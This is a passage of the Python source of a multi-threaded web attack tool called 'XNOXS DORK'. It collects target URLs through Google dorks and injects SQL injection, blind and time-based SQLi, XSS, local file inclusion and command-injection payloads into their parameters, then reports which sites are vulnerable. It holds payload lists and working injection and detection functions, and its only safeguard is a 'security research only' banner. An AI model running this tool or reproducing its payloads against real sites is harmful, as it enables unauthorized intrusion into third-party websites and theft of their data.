        'inurl:download.php?file=',
        'inurl:show.php?file=',
        'inurl:readfile.php?file=',
    ],
    'RCE (Remote Code Execution)': [
        'inurl:cmd= filetype:php',
        'inurl:exec= filetype:php',
        'inurl:command= filetype:php',
        'inurl:execute= filetype:php',
        'inurl:ping= filetype:php',
        'inurl:query= filetype:php',
        'inurl:shell= filetype:php',
        'inurl:process= filetype:php',
        'inurl:run= filetype:php',
        'inurl:system= filetype:php',
        'inurl:do= filetype:php',
        'inurl:func= filetype:php',
    ],
    'XSS (Cross-Site Scripting)': [
        'inurl:search= filetype:php',
        'inurl:q= filetype:php',
        'inurl:query= filetype:php',
        'inurl:keyword= filetype:php',
        'inurl:message= filetype:php',
        'inurl:comment= filetype:php',
        'inurl:name= filetype:php',
        'inurl:email= filetype:php',
        'inurl:feedback= filetype:php',
        'inurl:review= filetype:php',
    ],
}

BLIND_SQLI_PAYLOADS = [
    # Boolean-based - Single quote
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("' AND 1=1/*", "' AND 1=2/*"),
    # Boolean-based - Double quote
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    # Boolean-based - Numeric
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 AND 2>1", "1 AND 1>2"),
    # Boolean-based - With closing parenthesis
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("')) AND (('1'='1", "')) AND (('1'='2"),
    # Boolean-based - Advanced
    ("' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--", "' AND ASCII(SUBSTRING((SELECT database()),1,1))>255--"),
    ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
    # OR-based bypass
    ("' OR 'x'='x", "' OR 'x'='y"),
    ("' OR 1-- -", "' OR 0-- -"),
    ("-1' OR 1=1--", "-1' OR 1=2--"),
]

TIME_BASED_PAYLOADS = [
    # MySQL time-based
    ("' OR SLEEP(5)--", 5),
    ("' AND SLEEP(5)--", 5),
    ("' AND IF(1=1,SLEEP(5),0)--", 5),
    ("' AND (SELECT SLEEP(5))--", 5),
    ("1' AND SLEEP(5)#", 5),
    ("' OR BENCHMARK(10000000,SHA1('test'))--", 5),
    # MSSQL time-based
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("' WAITFOR DELAY '0:0:5'--", 5),
    ("'; IF (1=1) WAITFOR DELAY '0:0:5'--", 5),
    # PostgreSQL time-based
    ("' OR pg_sleep(5)--", 5),
    ("'; SELECT pg_sleep(5)--", 5),
    ("' AND (SELECT pg_sleep(5))--", 5),
    ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
    # Oracle time-based
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", 5),
]


def export_to_json(filename=None):
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xnoxs_results_{timestamp}.json"
    
    data = {
        "scan_date": datetime.now().isoformat(),
        "total_vulnerabilities": {
            "sqli": len(all_vulnerabilities),
            "blind_sqli": len(all_blind_sqli_vulnerabilities),
            "xss": len(all_xss_vulnerabilities),
            "dom_xss": len(all_dom_xss_vulnerabilities),
            "lfi": len(all_lfi_vulnerabilities),
            "rce": len(all_rce_vulnerabilities)
        },
        "sql_injection": all_vulnerabilities,
        "blind_sql_injection": all_blind_sqli_vulnerabilities,
        "reflected_xss": all_xss_vulnerabilities,
        "dom_xss": all_dom_xss_vulnerabilities,
        "lfi": all_lfi_vulnerabilities,
        "rce": all_rce_vulnerabilities
    }
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    
    return filename


def export_to_csv(filename=None):
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xnoxs_results_{timestamp}.csv"
    
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Type', 'URL', 'Parameter', 'Details', 'Severity'])
        
        for vuln in all_vulnerabilities:
            writer.writerow(['SQL Injection', vuln['url'], vuln['parameter'], 
                           f"DB: {vuln['db_type']}", 'Critical'])
        
        for vuln in all_blind_sqli_vulnerabilities:
            writer.writerow(['Blind SQL Injection', vuln['url'], vuln['parameter'],
                           f"Type: {vuln['type']}", 'Critical'])
        
        for vuln in all_xss_vulnerabilities:
            writer.writerow(['Reflected XSS', vuln['url'], vuln['parameter'],
                           f"Payload: {vuln['payload'][:50]}", 'High'])
        
        for vuln in all_dom_xss_vulnerabilities:
            writer.writerow(['DOM XSS', vuln['url'], '-',
                           f"Source: {vuln['source']}, Sink: {vuln['sink']}", 'High'])
        
        for vuln in all_lfi_vulnerabilities:
            writer.writerow(['LFI', vuln['url'], vuln['parameter'],
                           f"File: {vuln['file_type']}, Payload: {vuln['payload'][:30]}", 'Critical'])
        
        for vuln in all_rce_vulnerabilities:
            writer.writerow(['RCE', vuln['url'], vuln['parameter'],
                           f"Payload: {vuln['payload'][:30]}", 'Critical'])
    
    return filename


def export_to_html(filename=None):
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xnoxs_results_{timestamp}.html"
    
    total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities) +
                   len(all_lfi_vulnerabilities) + len(all_rce_vulnerabilities))
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XNOXS DORK - Scan Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #e94560; text-align: center; }}
        h2 {{ color: #0f3460; background: #e94560; padding: 10px; border-radius: 5px; }}
        h2.lfi {{ background: #27ae60; }}
        h2.rce {{ background: #c0392b; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; flex-wrap: wrap; }}
        .stat {{ background: #16213e; padding: 20px; border-radius: 10px; text-align: center; min-width: 120px; margin: 10px; }}
        .stat h3 {{ margin: 0; font-size: 2em; }}
        .critical {{ color: #e94560; }}
        .high {{ color: #f39c12; }}
        .lfi {{ color: #27ae60; }}
        .rce {{ color: #c0392b; }}
        .vuln-card {{ background: #16213e; margin: 10px 0; padding: 15px; border-radius: 5px; border-left: 4px solid #e94560; }}
        .vuln-card.xss {{ border-left-color: #f39c12; }}
        .vuln-card.dom {{ border-left-color: #9b59b6; }}
        .vuln-card.lfi {{ border-left-color: #27ae60; }}
        .vuln-card.rce {{ border-left-color: #c0392b; }}
        .label {{ color: #888; font-size: 0.9em; }}
        .value {{ color: #fff; word-break: break-all; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #0f3460; }}
        .footer {{ text-align: center; margin-top: 40px; color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XNOXS DORK - Vulnerability Report</h1>
        <p style="text-align: center; color: #888;">Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        
        <div class="summary">
            <div class="stat"><h3 class="critical">{len(all_vulnerabilities)}</h3><p>SQL Injection</p></div>
            <div class="stat"><h3 class="critical">{len(all_blind_sqli_vulnerabilities)}</h3><p>Blind SQLi</p></div>
            <div class="stat"><h3 class="high">{len(all_xss_vulnerabilities)}</h3><p>Reflected XSS</p></div>
            <div class="stat"><h3 class="high">{len(all_dom_xss_vulnerabilities)}</h3><p>DOM XSS</p></div>
            <div class="stat"><h3 class="lfi">{len(all_lfi_vulnerabilities)}</h3><p>LFI</p></div>
            <div class="stat"><h3 class="rce">{len(all_rce_vulnerabilities)}</h3><p>RCE</p></div>
            <div class="stat"><h3>{total_vulns}</h3><p>Total</p></div>
        </div>
"""
    
    if all_vulnerabilities:
        html_content += "<h2>SQL Injection Vulnerabilities</h2>"
        for vuln in all_vulnerabilities:
            html_content += f"""
        <div class="vuln-card">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
            <p><span class="label">Database:</span> <span class="value">{html.escape(vuln['db_type'])}</span></p>
        </div>"""
    
    if all_blind_sqli_vulnerabilities:
        html_content += "<h2>Blind SQL Injection Vulnerabilities</h2>"
        for vuln in all_blind_sqli_vulnerabilities:
            html_content += f"""
        <div class="vuln-card">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
            <p><span class="label">Type:</span> <span class="value">{html.escape(vuln['type'])}</span></p>
        </div>"""
    
    if all_xss_vulnerabilities:
        html_content += "<h2>Reflected XSS Vulnerabilities</h2>"
        for vuln in all_xss_vulnerabilities:
            html_content += f"""
        <div class="vuln-card xss">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
            <p><span class="label">Payload:</span> <span class="value">{html.escape(vuln['payload'])}</span></p>
        </div>"""
    
    if all_dom_xss_vulnerabilities:
        html_content += "<h2>DOM-based XSS Vulnerabilities</h2>"
        for vuln in all_dom_xss_vulnerabilities:
            html_content += f"""
        <div class="vuln-card dom">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Source:</span> <span class="value">{html.escape(vuln['source'])}</span></p>
            <p><span class="label">Sink:</span> <span class="value">{html.escape(vuln['sink'])}</span></p>
        </div>"""
    
    if all_lfi_vulnerabilities:
        html_content += "<h2 class='lfi'>LFI (Local File Inclusion) Vulnerabilities</h2>"
        for vuln in all_lfi_vulnerabilities:
            html_content += f"""
        <div class="vuln-card lfi">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
            <p><span class="label">File Type:</span> <span class="value">{html.escape(vuln['file_type'])}</span></p>
            <p><span class="label">Payload:</span> <span class="value">{html.escape(vuln['payload'])}</span></p>
        </div>"""
    
    if all_rce_vulnerabilities:
        html_content += "<h2 class='rce'>RCE (Remote Code Execution) Vulnerabilities</h2>"
        for vuln in all_rce_vulnerabilities:
            html_content += f"""
        <div class="vuln-card rce">
            <p><span class="label">URL:</span> <span class="value">{html.escape(vuln['url'])}</span></p>
            <p><span class="label">Parameter:</span> <span class="value">{html.escape(vuln['parameter'])}</span></p>
            <p><span class="label">Payload:</span> <span class="value">{html.escape(vuln['payload'])}</span></p>
            <p><span class="label">Evidence:</span> <span class="value">{html.escape(vuln.get('evidence', 'N/A'))}</span></p>
        </div>"""
    
    html_content += """
        <div class="footer">
            <p>Generated by XNOXS DORK - Multi-Vulnerability Scanner</p>
            <p>For Security Research Purposes Only</p>
        </div>
    </div>
</body>
</html>"""
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    return filename


def import_urls_from_file(filepath):
    urls = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith('#'):
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    urls.append(url)
        urls = list(dict.fromkeys(urls))
        urls = filter_urls(urls)
        return urls
    except FileNotFoundError:
        return None
    except Exception as e:
        print_error(f"Error reading file: {str(e)}")
        return []


def detect_blind_sqli(url, timeout=10):
    blind_vulns = []
    parsed = urllib.parse.urlparse(url)
    
    if not parsed.query:
        return blind_vulns
    
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    
    for param in params:
        for true_payload, false_payload in BLIND_SQLI_PAYLOADS:
            try:
                new_params_true = params.copy()
                original_value = new_params_true[param][0] if new_params_true[param] else ''
                new_params_true[param] = [original_value + true_payload]
                true_query = urllib.parse.urlencode(new_params_true, doseq=True)
                true_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                                     parsed.params, true_query, parsed.fragment))
                
                new_params_false = params.copy()
                new_params_false[param] = [original_value + false_payload]
                false_query = urllib.parse.urlencode(new_params_false, doseq=True)
                false_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                                      parsed.params, false_query, parsed.fragment))
                
                true_response = test_url(true_url, timeout)
                false_response = test_url(false_url, timeout)
                
                if true_response and false_response:
                    true_len = len(true_response)
                    false_len = len(false_response)
                    
                    diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
                    
                    if diff_ratio > 0.1:
                        vuln = {
                            'url': url,
                            'parameter': param,
                            'type': 'Boolean-based Blind SQLi',
                            'true_payload': true_payload,
                            'false_payload': false_payload
                        }
                        blind_vulns.append(vuln)
                        with thread_lock:
                            all_blind_sqli_vulnerabilities.append(vuln)
                        return blind_vulns
                        
            except Exception:
                continue
    
    return blind_vulns


def detect_time_based_sqli(url, timeout=10):
    time_vulns = []
    parsed = urllib.parse.urlparse(url)
    
    if not parsed.query:
        return time_vulns
    
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    
    for param in params:
        for payload, delay in TIME_BASED_PAYLOADS[:2]:
            try:
                new_params = params.copy()
                original_value = new_params[param][0] if new_params[param] else ''
                new_params[param] = [original_value + payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                injected_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                                         parsed.params, new_query, parsed.fragment))
                
                start_time = time.time()
                try:
                    requests.get(injected_url, timeout=timeout + delay + 2, verify=False,
                               headers={'User-Agent': 'Mozilla/5.0'})
                except requests.Timeout:
                    pass
                elapsed = time.time() - start_time
                
                if elapsed >= delay - 1:
                    vuln = {
                        'url': url,
                        'parameter': param,
                        'type': 'Time-based Blind SQLi',
                        'payload': payload,
                        'delay': f"{elapsed:.2f}s"
                    }
                    time_vulns.append(vuln)
                    with thread_lock:
                        all_blind_sqli_vulnerabilities.append(vuln)
                    return time_vulns
                    
            except Exception:
                continue
    
    return time_vulns


def print_blind_sqli_vuln(url, param, sqli_type):
    print(f"""
    {Fore.RED}╔{'═'*66}╗
    ║{Back.RED}{Fore.WHITE}  VULNERABLE  {Style.RESET_ALL}{Fore.RED}║ {sqli_type} Detected!{' '*(34-len(sqli_type))}║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.RED}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Parameter:{Style.RESET_ALL} {param}{' ' * (51 - len(param))} {Fore.RED}║
    {Fore.RED}╚{'═'*66}╝{Style.RESET_ALL}
""")


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.RED}  ██╗  ██╗███╗   ██╗ ██████╗ ██╗  ██╗███████╗  {Fore.MAGENTA}██████╗  ██████╗ ██████╗ ██╗  ██╗{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}  ╚██╗██╔╝████╗  ██║██╔═══██╗╚██╗██╔╝██╔════╝  {Fore.MAGENTA}██╔══██╗██╔═══██╗██╔══██╗██║ ██╔ {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ╚███╔╝ ██╔██╗ ██║██║   ██║ ╚███╔╝ ███████╗  {Fore.MAGENTA}██║  ██║██║   ██║██████╔╝█████╔╝ {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ██╔██╗ ██║╚██╗██║██║   ██║ ██╔██╗ ╚════██║  {Fore.MAGENTA}██║  ██║██║   ██║██╔══██╗██╔═██╗ {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}  ██╔╝ ██╗██║ ╚████║╚██████╔╝██╔╝ ██╗███████║  {Fore.MAGENTA}██████╔╝╚██████╔╝██║  ██║██║  ██╗{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝  {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.CYAN}║
{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║{Fore.WHITE}            SQLi & XSS Vulnerability Scanner v3.0 [Multi-threaded]              {Fore.CYAN}║
{Fore.CYAN}║{Fore.GREEN}                      For Security Research Purposes Only                       {Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
    print(banner)


def print_menu():
    api_status = f"{Fore.GREEN}Active"
    
    menu = f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │                                                                    │
    │  {Fore.YELLOW}[1]{Fore.WHITE} ◆  Scan dengan Google Dork (Multi-threaded)                   {Fore.CYAN}│
    │  {Fore.YELLOW}[2]{Fore.WHITE} ◆  Scan URL Tunggal                                           {Fore.CYAN}│
    │  {Fore.YELLOW}[3]{Fore.WHITE} ◆  Scan URL dari File                                         {Fore.CYAN}│
    │  {Fore.YELLOW}[4]{Fore.WHITE} ◆  Lihat Hasil Vulnerability                                  {Fore.CYAN}│
    │  {Fore.YELLOW}[5]{Fore.WHITE} ◆  Export Hasil                                               {Fore.CYAN}│
    │  {Fore.YELLOW}[6]{Fore.WHITE} ◆  Pengaturan                                                 {Fore.CYAN}│
    │  {Fore.YELLOW}[7]{Fore.WHITE} ◆  Tentang Tool                                               {Fore.CYAN}│
    │  {Fore.YELLOW}[0]{Fore.WHITE} ◆  Keluar                                                     {Fore.CYAN}│
    │                                                                    │
    ├────────────────────────────────────────────────────────────────────┤
    │  {Fore.MAGENTA}Threads: {Fore.WHITE}{settings['threads']}  {Fore.CYAN}│  {Fore.MAGENTA}Timeout: {Fore.WHITE}{settings['timeout']}s  {Fore.CYAN}│  {Fore.MAGENTA}Results: {Fore.WHITE}{settings['num_results']}  {Fore.CYAN}│  {Fore.MAGENTA}API: {api_status}      {Fore.CYAN}│
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""
    print(menu)


def print_divider():
    print(f"\n    {Fore.CYAN}{'═' * 68}{Style.RESET_ALL}\n")


def print_info(msg):
    print(f"    {Fore.BLUE}[*]{Style.RESET_ALL} {msg}")


def print_success(msg):
    print(f"    {Fore.GREEN}[+]{Style.RESET_ALL} {msg}")


def print_error(msg):
    print(f"    {Fore.RED}[-]{Style.RESET_ALL} {msg}")


def print_warning(msg):
    print(f"    {Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")


def print_vuln(url, db_type, error_snippet):
    print(f"""
    {Fore.RED}╔{'═'*66}╗
    ║{Back.RED}{Fore.WHITE}  VULNERABLE  {Style.RESET_ALL}{Fore.RED}║ SQL Injection Detected!                           ║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.RED}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Database:{Style.RESET_ALL} {db_type}{' ' * (53 - len(db_type))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Error:{Style.RESET_ALL} {error_snippet[:56]}{'...' if len(error_snippet) > 56 else ''}{' ' * max(0, 56 - len(error_snippet[:56]))} {Fore.RED}║
    {Fore.RED}╚{'═'*66}╝{Style.RESET_ALL}
""")


def print_xss_vuln(url, xss_type, payload):
    payload_display = payload[:50] if len(payload) > 50 else payload
    print(f"""
    {Fore.MAGENTA}╔{'═'*66}╗
    ║{Back.MAGENTA}{Fore.WHITE}  VULNERABLE  {Style.RESET_ALL}{Fore.MAGENTA}║ XSS (Cross-Site Scripting) Detected!              ║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.MAGENTA}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.MAGENTA}║
    {Fore.MAGENTA}║{Fore.YELLOW} Type:{Style.RESET_ALL} {xss_type}{' ' * (57 - len(xss_type))} {Fore.MAGENTA}║
    {Fore.MAGENTA}║{Fore.YELLOW} Payload:{Style.RESET_ALL} {payload_display}{' ' * max(0, 54 - len(payload_display))} {Fore.MAGENTA}║
    {Fore.MAGENTA}╚{'═'*66}╝{Style.RESET_ALL}
""")


def print_dom_xss_vuln(url, source, sink):
    source_display = source[:45] if len(source) > 45 else source
    sink_display = sink[:45] if len(sink) > 45 else sink
    print(f"""
    {Fore.YELLOW}╔{'═'*66}╗
    ║{Back.YELLOW}{Fore.BLACK}  VULNERABLE  {Style.RESET_ALL}{Fore.YELLOW}║ DOM-based XSS Detected!                           ║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.YELLOW}║{Fore.WHITE} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Source:{Style.RESET_ALL} {source_display}{' ' * max(0, 55 - len(source_display))} {Fore.YELLOW}║
    {Fore.YELLOW}║{Fore.WHITE} Sink:{Style.RESET_ALL} {sink_display}{' ' * max(0, 57 - len(sink_display))} {Fore.YELLOW}║
    {Fore.YELLOW}╚{'═'*66}╝{Style.RESET_ALL}
""")


def loading_animation(text, duration=1):
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        print(f"\r    {Fore.CYAN}{frames[i % len(frames)]}{Style.RESET_ALL} {text}", end='', flush=True)
        time.sleep(0.1)
        i += 1
    print(f"\r    {Fore.GREEN}✓{Style.RESET_ALL} {text}")


def progress_bar(current, total, prefix=''):
    bar_length = 40
    filled = int(bar_length * current / total)
    bar = f"{Fore.GREEN}{'█' * filled}{Fore.WHITE}{'░' * (bar_length - filled)}{Style.RESET_ALL}"
    percent = f"{100 * current / total:.1f}%"
    print(f"\r    {prefix} [{bar}] {percent} ({current}/{total})", end='', flush=True)


def detect_sql_error(response_text):
    for db_type, patterns in SQL_ERROR_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 100)
                snippet = response_text[start:end].strip()
                snippet = re.sub(r'<[^>]+>', '', snippet)
                return db_type, snippet
    return None, None


def detect_xss(response_text, payload):
    if payload in response_text:
        return 'Reflected XSS', payload
    
    decoded_payload = html.unescape(payload)
    if decoded_payload in response_text:
        return 'Reflected XSS (HTML Decoded)', payload
    
    for pattern in XSS_DETECTION_PATTERNS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return 'Reflected XSS', payload
    
    return None, None


def detect_dom_xss(response_text):
    dom_vulns = []
    found_sources = []
    found_sinks = []
    
    for source_pattern in DOM_XSS_SOURCES:
        matches = re.findall(source_pattern, response_text, re.IGNORECASE)
        if matches:
            found_sources.append(source_pattern.replace('\\', ''))
    
    for sink_pattern in DOM_XSS_SINKS:
        matches = re.findall(sink_pattern, response_text, re.IGNORECASE)
        if matches:
            found_sinks.append(sink_pattern.replace('\\', '').replace(r'\s*', '').replace(r'\(', '('))
    
    if found_sources and found_sinks:
        for source in found_sources[:3]:
            for sink in found_sinks[:3]:
                dom_vulns.append({
                    'source': source,
                    'sink': sink
                })
    
    return dom_vulns


def scan_dom_xss(url, timeout=10, silent=False):
    dom_vulns = []
    
    response_text = test_url(url, timeout)
    
    if response_text:
        detected_dom = detect_dom_xss(response_text)
        
        for dom in detected_dom:
            vuln = {
                'url': url,
                'source': dom['source'],
                'sink': dom['sink']
            }
            dom_vulns.append(vuln)
            with thread_lock:
                all_dom_xss_vulnerabilities.append(vuln)
            if not silent:
                with thread_lock:
                    print_dom_xss_vuln(url, dom['source'], dom['sink'])
            break
    
    return dom_vulns


def inject_xss_payload(url, payload):
    parsed = urllib.parse.urlparse(url)
    
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        injected_urls = []
        
        for param in params:
            new_params = params.copy()
            original_value = new_params[param][0] if new_params[param] else ''
            new_params[param] = [original_value + payload]
            
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            injected_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            injected_urls.append((param, injected_url, payload))
        
        return injected_urls
    else:
        return [('path', url + urllib.parse.quote(payload), payload)]


def scan_xss(url, timeout=10, silent=False):
    xss_vulns = []
    tested_params = set()
    
    for payload in XSS_PAYLOADS:
        injected_urls = inject_xss_payload(url, payload)
        
        for param_name, injected_url, used_payload in injected_urls:
            if param_name in tested_params:
                continue
            
            response_text = test_url(injected_url, timeout)
            
            if response_text:
                xss_type, detected_payload = detect_xss(response_text, used_payload)
                
                if xss_type:
                    vuln = {
                        'url': injected_url,
                        'parameter': param_name,
                        'xss_type': xss_type,
                        'payload': used_payload
                    }
                    xss_vulns.append(vuln)
                    with thread_lock:
                        all_xss_vulnerabilities.append(vuln)
                    tested_params.add(param_name)
                    if not silent:
                        with thread_lock:
                            print_xss_vuln(injected_url, xss_type, used_payload)
    
    return xss_vulns


def normalize_response(response_text):
    """Normalize response text by decoding HTML entities and base64."""
    import base64
    
    normalized = html.unescape(response_text)
    
    normalized = normalized.replace('&lt;', '<').replace('&gt;', '>')
    normalized = normalized.replace('&#60;', '<').replace('&#62;', '>')
    normalized = normalized.replace('&amp;', '&').replace('&quot;', '"')
    normalized = normalized.replace('&#039;', "'").replace('&apos;', "'")
    
    base64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'
    base64_matches = re.findall(base64_pattern, normalized)
    
    decoded_parts = []
    for b64_str in base64_matches:
        try:
            if len(b64_str) % 4 == 0:
                decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                if decoded and any(c.isalpha() for c in decoded):
                    decoded_parts.append(decoded)
        except:
            pass
    
    full_text = normalized + '\n' + '\n'.join(decoded_parts)
    return full_text


def detect_lfi(response_text):
    """Detect LFI vulnerability from response."""
    normalized = normalize_response(response_text)
    
    for file_type, patterns in LFI_DETECTION_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, normalized, re.IGNORECASE | re.MULTILINE)
            if match:
                start = max(0, match.start() - 30)
                end = min(len(normalized), match.end() + 50)
                snippet = normalized[start:end].strip()
                snippet = re.sub(r'<[^>]+>', '', snippet)
                snippet = ' '.join(snippet.split())
                return file_type, snippet
    return None, None


def detect_rce(response_text, expected_output=None):
    """Detect RCE vulnerability from response."""
    normalized = normalize_response(response_text)
    
    if expected_output:
        if expected_output in normalized:
            return True, expected_output
        if expected_output.lower() in normalized.lower():
            return True, expected_output
    
    for pattern in RCE_DETECTION_PATTERNS:
        match = re.search(pattern, normalized, re.IGNORECASE | re.MULTILINE)
        if match:
            start = max(0, match.start() - 20)
            end = min(len(normalized), match.end() + 50)
            snippet = normalized[start:end].strip()
            snippet = re.sub(r'<[^>]+>', '', snippet)
            snippet = ' '.join(snippet.split())
            return True, snippet
    
    return False, None


def inject_lfi_payload(url, payload):
    """Inject LFI payload into URL parameters."""
    parsed = urllib.parse.urlparse(url)
    
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        injected_urls = []
        
        for param in params:
            new_params = params.copy()
            new_params[param] = [payload]
            
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            injected_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            injected_urls.append((param, injected_url, payload))
        
        return injected_urls
    else:
        return []


def scan_lfi(url, timeout=10, silent=False):
    """Scan for Local File Inclusion vulnerabilities."""
    lfi_vulns = []
    tested_params = set()
    
    for payload in LFI_PAYLOADS[:30]:
        injected_urls = inject_lfi_payload(url, payload)
        
        for param_name, injected_url, used_payload in injected_urls:
            if param_name in tested_params:
                continue
            
            response_text = test_url(injected_url, timeout)
            
            if response_text:
                file_type, snippet = detect_lfi(response_text)
                
                if file_type:
                    vuln = {
                        'url': injected_url,
                        'parameter': param_name,
                        'file_type': file_type,
                        'payload': used_payload,
                        'evidence': snippet[:100] if snippet else ''
                    }
                    lfi_vulns.append(vuln)
                    with thread_lock:
                        all_lfi_vulnerabilities.append(vuln)
                    tested_params.add(param_name)
                    if not silent:
                        with thread_lock:
                            print_lfi_vuln(injected_url, param_name, file_type, used_payload)
                    break
        
        if lfi_vulns:
            break
    
    return lfi_vulns


def inject_rce_payload(url, payload):
    """Inject RCE payload into URL parameters."""
    parsed = urllib.parse.urlparse(url)
    
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        injected_urls = []
        
        for param in params:
            new_params = params.copy()
            original_value = new_params[param][0] if new_params[param] else ''
            new_params[param] = [original_value + payload]
            
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            injected_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
